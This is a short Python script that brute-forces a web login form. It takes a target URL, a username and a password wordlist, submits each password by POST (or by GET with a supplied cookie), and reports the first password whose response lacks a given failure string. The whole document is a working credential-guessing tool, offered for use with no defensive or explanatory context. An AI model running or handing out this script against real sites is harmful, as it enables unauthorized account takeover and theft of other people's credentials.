import requests 

url = input('[+] Enter page URL:  ')
username = input('[+] Enter Username for the Account To Bruteforce: ')
password_file = input('[+] Enter Password File to Use: ')
login_failed_string = input('[+] Enter String that occurs when login fails: ')
cookie_value = input('Give me some Cookies (optional): ')

def cracking(username, url):
        for password in passwords:
                password = password.strip()
                print('Trying: ' + password)
                # change the username field to the apporpiate value on the webpage
                data = {'username':username, 'password':password, 'Login':'submit'}
                response = requests.post(url, data=data)
                if cookie_value != '':
                        #check if it a get request
                        response = requests.get(url, params={'username':username, 'password':password, 'Login':'Login'}, cookies={'cookie': cookie_value})
                if login_failed_string in response.content.decode():
                        pass
                else:
                        print('[+] Found Username: ==> ' + username)
                        print('[+] Found Password: ==> ' + password)
                        exit()







with open(password_file, 'r') as passwords:
        cracking(username, url)

   